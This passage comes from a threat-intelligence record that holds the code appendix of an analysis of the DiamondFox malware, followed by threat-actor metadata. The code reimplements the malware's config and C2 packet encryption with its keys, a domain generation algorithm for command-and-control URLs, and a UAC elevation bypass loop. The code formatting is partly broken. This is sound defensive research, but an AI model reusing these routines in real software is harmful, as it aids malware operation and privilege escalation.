= calculate_dec_key(conf)\nkey = calculate_key(key)\nconf = decrypt_data(conf, key)\n\n```\nwith open('config_dec.dat', 'wb') as f:\n```\n  f.write(conf)\n\n```\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n**Lower Level Decryption Algorithm**\n\ndef config_get_option(conf, options, opt_no, key=None):\nsi = conf.find(options[opt_no] + '>')\nei = conf[si:].find('<' + options[opt_no])\n```\n  if ei == -1:\n    return\n  opt_v = conf[si + len(options[opt_no]) + 1:si + ei]\n  if key:\n\n```\nopt_v = decrypt_config(opt_v, key)\n```\n  return opt_v\ndef decrypt_all_options_correct(conf):\n  lb = 0x60\n  ub = 0x7A\n  opt_split = ','\n  opt_min = 1\n  opt_max = 0x29\n  lln = len(conf) - 0x3c\n  decrypt_options = [0, 1, 2, 4, 5, 0x15, 0x16, 0x24, 0x25, 0x26, 0x27, 0x28]\n  key_option = 3\n  while lb + lln > ub:\n    lln = lb + lln - ub\n  idx_i = 0\n  opt_buff = \"\"\n  # generate buffer with option names\n  for i in xrange(opt_min, opt_max + 1):\n    if 0x61 + idx_i >= 0x7b:\n      idx_i = 0\n      lln += 1\n    if lb + lln > 0x7a:\n      lln = 1\n    opt_buff += chr(lb + lln) + chr(0x61 + idx_i)\n    idx_i += 2\n    if i < 0x29:\n      opt_buff += opt_split\n  options = opt_buff.split(opt_split)\n  # extract key before all options\n\n```\nopt_v = config_get_option(conf, options, key_option)\n```\n  if opt_v is None:\n\n```\nprint '[-] Unable to find key :('\n```\n    return\n  key = b64decode(opt_v)\n\n```\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n```\n  print '*' * 40\n  print '[+] Key: %s' % key\n  print '*' * 40\n  # extract all options\n  for i in xrange(opt_min - 1, opt_max):\n\n```\nopt_v = config_get_option(conf, options, i, key if i in decrypt_options else None)\n```\n    if i == key_option:\n      opt_v = b64decode(opt_v)\n\n```\nprint '[+] Config[%x] = %s. Option: %s' % (i, opt_v, options[i])\n\nwith open('config_dec.dat', 'rb') as f:\n```\n conf = f.read()\ndecrypt_all_options_correct(conf)\n\n###### Information Collection\n\n```\n**Collected Information String Encryption Algorithm**\n```\nimport random\nimport math\nfrom binascii import hexlify, unhexlify\ndef encrypt_pc_info_packet(data, key):\n  r = random.random()\n  v = (r * 0x63 + 1)\n  vv = 0\n  enc_data = ''\n  for k in key:\n    vv = ord(k) * math.fabs(math.cos(math.sqrt(vv)))\n  for d in data:\n    enc_data = chr(ord(d) ^ int(v + int(vv))) + enc_data\n  enc_data = chr(int(v)) + enc_data\n  enc_data_r = hexlify(enc_data)\n  return enc_data_r\nkey = \"6083623a732c8349a16cb9d5b6d84b61\" # NET_XOR_KEY\ndata = \"MY-PC||Windows 7 Ultimate|11226589|L!NK|Me|1.00|Intel(R) Core(TM) i7-3770 CPU @\n3.40GHz|NVIDIA GeForce 650GTX|1000.00|1|1|0|My-PC|\"\nenc_data = encrypt_pc_info_packet(data, key)\nprint '[+] Encrypted packet: %s' % enc_data\n\n```\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### NETWORK AND COMMUNICATIONS\n\n Bot Packet Decryption Routine\n```\nimport random\nimport math\nfrom binascii import hexlify, unhexlify\ndef decrypt_packet(data, key):\n  dec_data = unhexlify(data)\n  v = ord(dec_data[:1])\n  dec_data = dec_data[1:]\n  # restore vv\n  vv = 0\n  for k in key:\n    vv = ord(k) * math.fabs(math.cos(math.sqrt(vv)))\n  # decrypt data\n  ddata = ''\n  for d in dec_data:\n    ddata = chr(ord(d) ^ int(v + int(vv))) + ddata\n  return ddata\nNET_XOR_KEY = \"6083623a732c8349a16cb9d5b6d84b61\"\ndata = \"619=382c13007d291d2c602c612c612c60607e606060612c080417606566703533223f­\n1635177011191419061e2c2a181760647e6370107005001370606767637d673970791d047835223f1370790278\n3c35243e192c60607e612c3e383f1a2c1b1e711c2c14636967681466162c3524313d39243c0570677023273f34\n3e39072c2c13007d091d&z=1\"\n# cut additional info from the packet\ndata = data.split('=')[1]\n\n```\ndata = data[:data.find('&')]\n```\ndec_data = decrypt_packet(data, key)\nprint '[+] Decrypted packet: %s' % dec_data\n\n###### Bot Packet Brute Routine PoC\nimport random\nimport math\nfrom binascii import hexlify, unhexlify\nfrom string import printable\ndef brute_decrypt_packet(data):\n  dec_data = unhexlify(data)\n  v = ord(dec_data[:1])\n  dec_data = dec_data[1:]\n  # gen vv\n  vvv = [x for x in xrange(256)]\n\n```\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n```\ndatav = []\n  # decrypt data\n  for vv in vvv:\n    ddata = ''\n    for d in dec_data:\n      b = chr((ord(d) ^ int(v + int(vv))) & 0xFF)\n      if b not in printable:\n        break\n      ddata = b + ddata\n    if ddata.count('|') == 14 and len(ddata) == len(dec_data):\n      datav.append(ddata)\n  return datav\ndata =\n\"619=21457A691449584E78450945084508450900170000455C5A4B567F5C7E1978707D706F774543717E090D\n\n170A1979196C697A19090E0E0A140E501910746D115C4B567A19106B11555C4D5770450909170D4549584E784\n\n572771875450D0A01007D7F010D455C4D5854504D556C190E194A4E565D57506E45457A 691469786E78&z=1\"\n# cut additional info from the packet\ndata = data.split('=')[1]\n\n```\ndata = data[:data.find('&')]\n```\ndec_data_v = brute_decrypt_packet(data)\nprint '[+] Bruted packets: %s' % dec_data_v\n\n###### PROTECTIONS MECHANISMS\n\n Domain Generation Algirhm (DGA) Snippet Code\nfrom datetime import timedelta, datetime\nfrom math import tan, cos\n\n```\n# example of possible configuration values\n```\nCFG_TLDS = ['.com', '.net', '.org', '.info'] # 148, TLDS list\nCFG_DOMAIN_LEN = 7 # 108, domain length\nCFG_DOMAINS_COUNT = 10 # 112, domains count\nCFG_PERIOD_DAYS = 1 # 116, period (days)\n\n```\nCNC_ADDR = datetime(2015, 3, 22)  # specified instead of CNC_ADDR\n```\nNET_XOR_KEY = 'KWLdVfMiNNaUcrAddAaYhTt21NTySR'\nENC_KEY = '6083623a732c8349a16cb9d5b6d84b61'\ndef gen_domain(index, xor_key, enc_key, dt, init_date):\n  full_key = xor_key + enc_key\n  days_past = (dt - init_date).days\n  dt = init_date + timedelta(days=days_past-(days_past % CFG_PERIOD_DAYS))\n  new_date = dt + timedelta(days=index)\n  day = new_date.day\n  month = new_date.month\n  year = new_date.year\n  tld = CFG_TLDS[(month ^ day) % len(CFG_TLDS)]\n  seed = abs(((year & 0xFF00) // 256) * int(day * tan(year & 0xFF)) ^ int(cos(month * 10)))\n  if seed % 2:\n    seed ^= year // (month * day)\n\n```\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n```\n  domain = ''\n  for i in xrange(CFG_DOMAIN_LEN):\n    x = abs(((seed * ((i + 1) ^ (seed // 2))) % len(full_key)) - len(full_key))\n    domain += full_key[x - 1]\n  return 'http://' + domain.lower() + tld + '/gate.php'\nif __name__ == '__main__':\n  for i in xrange(CFG_DOMAINS_COUNT):\n    print gen_domain(i, NET_XOR_KEY, ENC_KEY, datetime.today(), CNC_ADDR)\n\n###### Manual UAB Bypass\n\n```\n**Manual UAC Bypass Technique**\n```\ndef uac_manual_bypass():\n  apps_before = count_proc_with_name(DF_NAME)\n  subprocess.popen(\"%WINDIR%\\system32\\cmd.exe /c DF_DIR\\EXE_NAME.exe -verb RunAs\")\n  while is_proc_present(\"consent.exe\"):\n    pass\n  apps_after = count_proc_with_name(DF_NAME)\n  if (apps_after <= apps_before)\n    uac_manual_bypass()\n  exit() # terminate current application because elevated instance was created\n\n```\n**Process Elevation Check**\n\nDWORD find_process_by_name(LPCSTR proc_name) {\n```\n  PROCESSENTRY32 entry;\n  DWORD pid = NULL;\n  entry.dwSize = sizeof(PROCESSENTRY32);\n  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n  if (Process32First(snapshot, &entry) == FALSE) {\n    goto clean;\n  }\n  while (Process32Next(snapshot, &entry) == TRUE)\n    if (!_stricmp(entry.szExeFile, proc_name)) {\n      pid = entry.th32ProcessID;\n      printf(\"[+] UAC process found: %s\\n\", proc_name);\n      goto clean;\n    }\nclean:\n  CloseHandle(snapshot);\n  return pid;\n}\nint main(int argc, char **argv) {\n  LPCSTR uac = \"consent.exe\";\n  DWORD pid;\n  while (true) {\n\n```\npid = find_process_by_name(uac);\n```\n    if (pid) printf(\"[+] UAC PID found: %u\\n\", pid);\n    Sleep(1000);\n  }\n  return 0;\n}\n\n```\n\n-----\n\n**DiamondFox Modular Malware – A One-Stop Shop**\n\n###### Volume Serial Number Initialization\n\n**Volume Serial Number – Initialize Global Variable**\n```\nfor logical_disk in query(\"select * from win32_LogicalDisk\"):\n  if len(logical_disk.VolumeSerialNumber) > 0:\n    VOLUME_SERIAL_NUM = logical_disk.VolumeSerialNumber\n    break\n  else:\n    vsm = GetSetting(\"L!NK\", \"1\", \"0\")\n    if (len(vsm) != 8):\n      SaveSetting(\"L!NK\", \"1\", \"0\", gen_randomm_8bytes_str())\n    VOLUME_SERIAL_NUM = vsm\n    break\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "http://blog.checkpoint.com/wp-content/uploads/2017/05/DiamondFox_Report_Appendix_170510-1.pdf"
    ],
    "report_names": [
        "DiamondFox_Report_Appendix_170510-1.pdf"
    ],
    "threat_actors": [
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1494407885,
    "ts_modification_date": 1494407887,
    "files": {
        "pdf": "https://archive.orkl.eu/2b24afeb825a14b4eb637371dadbb0eca60651c6.pdf",
        "text": "https://archive.orkl.eu/2b24afeb825a14b4eb637371dadbb0eca60651c6.txt",
        "img": "https://archive.orkl.eu/2b24afeb825a14b4eb637371dadbb0eca60651c6.jpg"
    }
}